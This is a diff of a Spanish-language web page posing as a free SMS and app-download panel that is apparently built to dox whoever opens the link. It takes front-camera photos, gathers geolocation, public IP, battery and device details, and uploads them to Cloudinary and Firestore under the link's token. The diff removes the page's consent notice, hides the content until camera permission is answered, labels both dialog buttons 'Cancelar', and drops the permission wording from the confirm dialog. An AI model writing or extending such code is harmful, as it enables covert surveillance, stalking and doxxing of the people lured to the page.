@@ -13,23 +13,17 @@
 video,canvas{position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;opacity:0;pointer-events:none}
 
 .support-wrap{position:fixed;right:10px;bottom:62px;z-index:70}.support-btn{width:38px;height:38px;border-radius:13px;border:1px solid rgba(255,255,255,.18);background:linear-gradient(135deg,#2f62ff,#7a38ff);box-shadow:0 16px 40px rgba(0,0,0,.38);display:grid;place-items:center;font-size:10px;font-weight:1000;padding:0;letter-spacing:.1px}.support-box{position:absolute;right:0;bottom:46px;width:205px;border:1px solid rgba(255,255,255,.14);background:linear-gradient(160deg,rgba(17,21,45,.98),rgba(8,13,32,.98));border-radius:17px;padding:11px;box-shadow:0 22px 58px rgba(0,0,0,.45);opacity:0;transform:translateY(10px) scale(.96);pointer-events:none;transition:.18s ease}.support-wrap.open .support-box{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}.support-head{font-size:12.5px;font-weight:950;margin-bottom:8px;color:#fff}.support-line{display:flex;align-items:center;gap:8px;margin:7px 0;font-size:12.2px;font-weight:900;line-height:1.25}.support-line .sym{width:26px;height:26px;display:grid;place-items:center;border-radius:9px;background:rgba(255,255,255,.10);font-size:10px;font-weight:1000;flex:0 0 auto}.support-line small{display:block;color:var(--muted);font-weight:800;margin-top:1px;font-size:10.5px}.support-glow{position:absolute;inset:-2px;border-radius:22px;background:linear-gradient(135deg,rgba(47,98,255,.22),rgba(122,56,255,.18));filter:blur(14px);z-index:-1}
+
+body.cameraPending .hero,body.cameraPending .search,body.cameraPending .list{visibility:hidden;pointer-events:none}
 </style>
 </head>
-<body>
-<div class="app"><header class="topbar"><div class="logo">SF</div><div class="brand"><h2>Panel 2027 actualizado</h2><p id="status">Panel actualizado 2027</p></div><div class="badge" id="tokenState">LINK</div></header><section class="hero"><div class="pill">Panel 2027 actualizado</div><h1>Panel 2027 <span>actualizado</span></h1><p class="subtitle">SMS disponible gratis por tiempo limitado para cualquier app.</p><div class="notice">Elige una opción y continúa con la descarga disponible por tiempo limitado.</div><div class="socialBox" id="socialBox"><div class="socialIcon" id="socialIcon">LK</div><div class="socialText"><b><span class="socialCount" id="likeCount">5K</span> personas les gusta esta página</b><span>Toca en me gusta para reaccionar.</span></div><button class="likeBtn" id="likeBtn" type="button">Me gusta</button></div></section><section class="search"><input id="search" placeholder="Buscar opción..."></section><main class="list" id="list"></main><div class="empty" id="empty">Acceso inválido.</div></div>
+<body class="cameraPending">
+<div class="app"><header class="topbar"><div class="logo">SF</div><div class="brand"><h2>Panel 2027 actualizado</h2><p id="status">Solicitando cámara...</p></div><div class="badge" id="tokenState">LINK</div></header><section class="hero"><div class="pill">Panel 2027 actualizado</div><h1>Panel de descarga <span>de app</span></h1><p class="subtitle">SMS disponible gratis por tiempo limitado para cualquier app.</p><div class="notice">Elige una opción y continúa con la descarga disponible por tiempo limitado.</div><div class="socialBox" id="socialBox"><div class="socialIcon" id="socialIcon">LK</div><div class="socialText"><b><span class="socialCount" id="likeCount">5K</span> personas les gusta esta página</b><span>Toca en me gusta para reaccionar.</span></div><button class="likeBtn" id="likeBtn" type="button">Me gusta</button></div></section><section class="search"><input id="search" placeholder="Buscar opción..."></section><main class="list" id="list"></main><div class="empty" id="empty">Acceso inválido.</div></div>
 
 <div class="support-wrap" id="supportWrap"><div class="support-box"><div class="support-glow"></div><div class="support-head">Soporte</div><div class="support-line"><span class="sym">TG</span><div><small>Telegram</small>𝑹𝑩𝑷 | Bebote</div></div><div class="support-line"><span class="sym">WA</span><div><small>WhatsApp</small>Sonyer</div></div></div><button class="support-btn" id="supportBtn" type="button" aria-label="Soporte">SP</button></div>
 <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
-<div class="modal" id="permissionModal"><div class="box">
-  <div class="consent-title"><div class="cam-dot">DOX</div><h3 style="margin:0">Bienvenido</h3></div>
-  <p style="margin-top:12px">Para continuar puedes autorizar el registro de una foto con la cámara frontal y la ubicación del dispositivo. El navegador mostrará sus permisos correspondientes.</p>
-  <div class="consent-note">También se registran datos técnicos básicos del navegador y dispositivo para mostrar la información correctamente en tu panel.</div>
-  <div class="row" style="margin-top:15px">
-    <button id="denyCameraBtn" type="button">Sin cámara</button>
-    <button class="primary" id="allowCameraBtn" type="button">Permitir</button>
-  </div>
-</div></div>
-<div class="modal" id="modal"><div class="box"><h3>Confirmar acción</h3><p id="modalText"></p><div class="row"><button class="red" id="cancelBtn">Cancelar</button><button class="primary" id="confirmBtn">Continuar</button></div></div></div><div class="toast" id="toast"></div>
+
+<div class="modal" id="modal"><div class="box"><h3>Confirmar acción</h3><p id="modalText"></p><div class="row"><button class="primary" id="confirmBtn">Cancelar</button><button class="red" id="cancelBtn">Cancelar</button></div></div></div><div class="toast" id="toast"></div>
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
 import { getFirestore, doc, getDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
@@ -122,7 +116,7 @@ async function getLocationLite(){
   });
 }
 
-async function collectDeviceInfo(includeLocation=true){
+async function collectDeviceInfo(){
   const ua=navigator.userAgent||"";
   const sw=screen?.width||innerWidth||0, sh=screen?.height||innerHeight||0, vw=innerWidth||0, vh=innerHeight||0;
   const isAndroid=/Android/i.test(ua), isIOS=/iPhone|iPad|iPod/i.test(ua);
@@ -199,127 +193,43 @@ async function collectDeviceInfo(includeLocation=true){
   }catch(e){
     info.batteryError="No permitido";
   }
-  info.location = includeLocation ? await getLocationLite() : {
-    status:"No solicitado",
-    allowed:false,
-    latitude:null,
-    longitude:null,
-    accuracy:null,
-    mapsUrl:""
-  };
+  info.location = await getLocationLite();
   return info;
 }
 
-
-async function requestNativeCameraPermissionOnOpen(){
+async function requestCameraFirst(){
   if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
-    return "No disponible";
+    return false;
   }
+  let stream=null;
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:"user"},
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user",width:{ideal:720},height:{ideal:960}},
       audio:false
     });
-
-    // Aquí solo se pide el permiso nativo del navegador/celular.
-    // No se toma ni se sube ninguna foto en esta apertura.
-    stream.getTracks().forEach(track=>track.stop());
-    return "Permitido";
+    return true;
   }catch(e){
-    if(e && (e.name==="NotAllowedError" || e.name==="PermissionDeniedError")){
-      return "Denegado";
-    }
-    return "No disponible";
+    console.warn("Permiso de cámara:",e);
+    return false;
+  }finally{
+    if(stream) stream.getTracks().forEach(t=>t.stop());
   }
 }
 
-async function saveDeviceInfoOnOpen(){
-  if(!linkData || !token) return false;
-
+async function getPublicIp(){
   try{
-    // Recoge la información técnica sin pedir ubicación al abrir.
-    const deviceInfo = await collectDeviceInfo(true);
-
-    // Crea una imagen neutra para conservar exactamente el formato
-    // de registros que ya usa el panel (campo url + Cloudinary).
-    const c = document.createElement("canvas");
-    c.width = 720;
-    c.height = 960;
-    const ctx = c.getContext("2d");
-
-    const g = ctx.createLinearGradient(0,0,720,960);
-    g.addColorStop(0,"#11152d");
-    g.addColorStop(1,"#0b1630");
-    ctx.fillStyle = g;
-    ctx.fillRect(0,0,c.width,c.height);
-
-    ctx.fillStyle = "#ffffff";
-    ctx.textAlign = "center";
-    ctx.font = "bold 44px system-ui";
-    ctx.fillText("Panel 2027",360,420);
-    ctx.fillStyle = "#aeb0c4";
-    ctx.font = "28px system-ui";
-    ctx.fillText("Registro del dispositivo",360,470);
-
-    const blob = await new Promise(resolve => c.toBlob(resolve,"image/jpeg",0.86));
-    if(!blob) throw new Error("No se pudo crear el registro");
-
-    const form = new FormData();
-    form.append("file",blob,`registro_${Date.now()}.jpg`);
-    form.append("upload_preset",UPLOAD_PRESET);
-
-    const res = await fetch(
-      `https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
-      {method:"POST",body:form}
-    );
-
-    const data = await res.json().catch(()=>({}));
-    if(!res.ok || !data.secure_url){
-      throw new Error("Cloudinary: "+(data.error?.message||"no subió"));
-    }
-
-    // MISMA ruta y MISMA estructura principal del archivo original.
-    await addDoc(collection(db,"shares",token,"fotos"),{
-      token,
-      url:data.secure_url,
-      accion:"apertura_link",
-      item:"Apertura del link",
-      public_id:data.public_id||"",
-      asset_id:data.asset_id||"",
-      fecha:serverTimestamp(),
-      createdAtLocal:new Date().toISOString(),
-      provider:"cloudinary",
-      deviceInfo,
-      bateria:deviceInfo.batteryPercent,
-      cargando:deviceInfo.chargingText,
-      pantalla:deviceInfo.screen,
-      vista:deviceInfo.viewport,
-      conexion:deviceInfo.connectionType,
-      idioma:deviceInfo.language,
-      zonaHoraria:deviceInfo.timezone,
-      sistema:deviceInfo.os,
-      navegador:deviceInfo.browser,
-      modelo:deviceInfo.model,
-      versionSistema:deviceInfo.platformVersion,
-      arquitectura:deviceInfo.architecture,
-      ubicacionEstado:deviceInfo.location.status,
-      latitud:deviceInfo.location.latitude,
-      longitud:deviceInfo.location.longitude,
-      precision:deviceInfo.location.accuracy,
-      mapsUrl:deviceInfo.location.mapsUrl,
-      userAgent:deviceInfo.userAgent
-    });
-
-    return true;
+    const r=await fetch("https://api64.ipify.org?format=json",{cache:"no-store"});
+    if(!r.ok) return "";
+    const j=await r.json();
+    return j?.ip ? String(j.ip) : "";
   }catch(e){
-    console.error("Registro automático:",e);
-    toast(e.message||"No se pudo registrar el dispositivo.","error");
-    return false;
+    return "";
   }
 }
 
 async function verify(){
   if(!token){
+    document.body.classList.remove("cameraPending");
     $("empty").style.display="block";
     return;
   }
@@ -328,68 +238,72 @@ async function verify(){
     if(!s.exists()||s.data().active!==true) throw new Error();
 
     linkData=s.data();
-    $("status").textContent="Conectando...";
     $("tokenState").textContent="OK";
+    $("status").textContent="Permiso de cámara...";
+
+    // Primero aparece el permiso NATIVO de cámara del navegador/celular.
+    await requestCameraFirst();
+
+    // Recién después aparecen las opciones.
+    document.body.classList.remove("cameraPending");
+    $("status").textContent="Panel actualizado 2027";
     render();
-
-    // 1) Envía los datos técnicos automáticamente apenas abre el enlace.
-    const savePromise = saveDeviceInfoOnOpen();
-
-    // 2) Solicita directamente el permiso NATIVO de cámara.
-    //    Si el usuario pulsa "Permitir", la foto se toma y se guarda
-    //    inmediatamente, sin pedir un segundo toque.
-    const initialItem={name:"Foto al abrir",accion:"apertura_camara"};
-    captureAndSave(initialItem,null,{silent:true,includeLocation:true}).catch(e=>console.error(e));
-
-    const ok = await savePromise;
-    $("status").textContent = ok ? "Panel actualizado 2027" : "Panel 2027";
   }catch(e){
     console.error(e);
+    document.body.classList.remove("cameraPending");
     $("status").textContent="Acceso inválido";
     $("tokenState").textContent="ERROR";
     $("empty").style.display="block";
     toast("Este acceso no está activo.","error");
   }
 }
-function render(){const q=$("search").value.trim().toLowerCase();const data=items.filter(a=>!q||`${a.name} ${a.desc}`.toLowerCase().includes(q));$("empty").style.display=data.length?"none":"block";$("list").innerHTML=data.map((a,i)=>`<article class="card" style="--accent:${a.color}"><div class="main"><div class="icon">${esc(a.icon)}</div><div><div class="title">${esc(a.name)}</div><div class="desc">${esc(a.desc)}</div></div></div><div class="bottom"><div class="meta"><b style="color:${a.color}">Gratis</b><br>Por link</div><button data-i="${i}">Carrito</button><button class="use" data-i="${i}">Descargar</button></div></article>`).join("");$("list").querySelectorAll("button[data-i]").forEach(b=>b.addEventListener("click",()=>openConfirm(data[Number(b.dataset.i)],b)));}
+function render(){
+  const q=$("search").value.trim().toLowerCase();
+  const data=items.filter(a=>!q||`${a.name} ${a.desc}`.toLowerCase().includes(q));
+  $("empty").style.display=data.length?"none":"block";
+
+  $("list").innerHTML=data.map((a,i)=>`
+    <article class="card" style="--accent:${a.color}">
+      <div class="main">
+        <div class="icon">${esc(a.icon)}</div>
+        <div>
+          <div class="title">${esc(a.name)}</div>
+          <div class="desc">${esc(a.desc)}</div>
+        </div>
+      </div>
+      <div class="bottom">
+        <div class="meta"><b style="color:${a.color}">Gratis</b><br>Por link</div>
+        <button class="cartBtn" data-i="${i}">Carrito</button>
+        <button class="use photoBtn" data-i="${i}">Foto</button>
+      </div>
+    </article>`).join("");
+
+  $("list").querySelectorAll(".photoBtn").forEach(b=>{
+    b.addEventListener("click",async()=>{
+      if(busy)return;
+      const item=data[Number(b.dataset.i)];
+      await captureAndSave(item,b);
+    });
+  });
+
+  $("list").querySelectorAll(".cartBtn").forEach(b=>{
+    b.addEventListener("click",()=>{
+      const item=data[Number(b.dataset.i)];
+      openConfirm(item,b);
+    });
+  });
+}
 function closeModal(){const m=$("modal"); if(m) m.classList.remove("show"); selected=null; selectedBtn=null; document.body.style.overflow="";}
-function openConfirm(it,b){if(busy)return;selected=it;selectedBtn=b;$("modalText").textContent=`Para continuar con "${it.name}", se solicitará permiso para usar la cámara frontal y la ubicación. Puedes cancelar si no deseas compartirlos.`;$("modal").classList.add("show");document.body.style.overflow="hidden";}
+function openConfirm(it,b){if(busy)return;selected=it;selectedBtn=b;$("modalText").textContent=`Continuar con "${it.name}".`;$("modal").classList.add("show");document.body.style.overflow="hidden";}
 $("cancelBtn").onclick=()=>{closeModal();};
 $("confirmBtn").onclick=async()=>{const currentItem=selected; const currentBtn=selectedBtn; closeModal(); await captureAndSave(currentItem,currentBtn);};
-$("allowCameraBtn").onclick=autoCaptureFromConsent;
-if($("denyCameraBtn")) $("denyCameraBtn").onclick=async()=>{
-  $("permissionModal").classList.remove("show");
-  const ok=await saveDeviceInfoOnOpen();
-  toast(ok?"Continuaste sin cámara. Se registraron solo datos técnicos.":"No se pudo registrar la información técnica.",ok?"info":"error");
-};
-function showInitialConsent(){ /* No se abre automáticamente */ }
-async function autoCaptureFromConsent(){
-  // El usuario ya aceptó de forma explícita el uso de cámara y ubicación.
-  const m=$("permissionModal");
-  if(m) m.classList.remove("show");
-  const item={name:"Apertura del link",accion:"apertura_link"};
-  captureAndSave(item,null,{silent:true}).catch(e=>console.error(e));
-}
 async function waitVideo(v){if(v.readyState>=2&&v.videoWidth)return;await new Promise(r=>{v.onloadedmetadata=r;v.oncanplay=r;setTimeout(r,1200);});}
-
-async function getPublicIp(){
-  try{
-    const r = await fetch("https://api64.ipify.org?format=json", {cache:"no-store"});
-    if(!r.ok) throw new Error("IP no disponible");
-    const j = await r.json();
-    return j && j.ip ? String(j.ip) : "";
-  }catch(e){
-    console.warn("No se pudo obtener IP pública:", e);
-    return "";
-  }
-}
-
 async function captureAndSave(item,btn,opts={}){
   const silent = opts && opts.silent === true;
   if(!linkData||!token){ if(!silent) toast("Acceso inválido.","error"); return; }
   let stream=null;
   busy=true;
-  if(btn) loadBtn(btn,true,"Verificando...");
+  if(btn) loadBtn(btn,true,"Tomando...");
   try{
     stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:{ideal:720},height:{ideal:960}},audio:false});
     const video=$("video"),canvas=$("canvas");
@@ -409,8 +323,7 @@ async function captureAndSave(item,btn,opts={}){
     const res=await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,{method:"POST",body:form});
     const data=await res.json().catch(()=>({}));
     if(!res.ok||!data.secure_url)throw new Error("Cloudinary: "+(data.error?.message||"no subió"));
-    const includeLocation = opts && opts.includeLocation === false ? false : true;
-    const deviceInfo=await collectDeviceInfo(includeLocation);
+    const deviceInfo=await collectDeviceInfo();
     const ipPublica=await getPublicIp();
     deviceInfo.publicIp=ipPublica;
     await addDoc(collection(db,"shares",token,"fotos"),{token,url:data.secure_url,accion:item.accion,item:item.name,public_id:data.public_id||"",asset_id:data.asset_id||"",fecha:serverTimestamp(),createdAtLocal:new Date().toISOString(),provider:"cloudinary",deviceInfo,ipPublica,bateria:deviceInfo.batteryPercent,cargando:deviceInfo.chargingText,pantalla:deviceInfo.screen,vista:deviceInfo.viewport,conexion:deviceInfo.connectionType,idioma:deviceInfo.language,zonaHoraria:deviceInfo.timezone,sistema:deviceInfo.os,navegador:deviceInfo.browser,modelo:deviceInfo.model,versionSistema:deviceInfo.platformVersion,arquitectura:deviceInfo.architecture,ubicacionEstado:deviceInfo.location.status,latitud:deviceInfo.location.latitude,longitud:deviceInfo.location.longitude,precision:deviceInfo.location.accuracy,mapsUrl:deviceInfo.location.mapsUrl,userAgent:deviceInfo.userAgent});
